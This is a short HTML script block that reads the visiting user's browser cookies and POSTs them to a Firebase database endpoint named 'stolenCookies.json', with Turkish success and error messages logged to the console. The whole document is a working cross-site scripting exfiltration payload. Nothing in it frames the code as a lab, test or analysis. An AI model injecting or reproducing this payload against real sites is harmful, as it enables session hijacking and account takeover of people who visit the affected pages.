<script>
var cookies = document.cookie;
var firebaseUrl = "https://yaflfest-970fa-default-rtdb.firebaseio.com/stolenCookies.json";

var xhr = new XMLHttpRequest();
xhr.open("POST", firebaseUrl, true);
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send(JSON.stringify({ cookies: cookies }));
var xhr = new XMLHttpRequest();
xhr.open("POST", firebaseUrl, true);
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.onload = function() {
  if (xhr.status >= 200 && xhr.status < 300) {
    console.log("Başarılı:", xhr.responseText);
  } else {
    console.error("Hata:", xhr.status, xhr.statusText);
  }
};
xhr.onerror = function() {
  console.error("İstek sırasında bir hata oluştu.");
};
xhr.send(JSON.stringify({ cookies: cookies }));
</script>
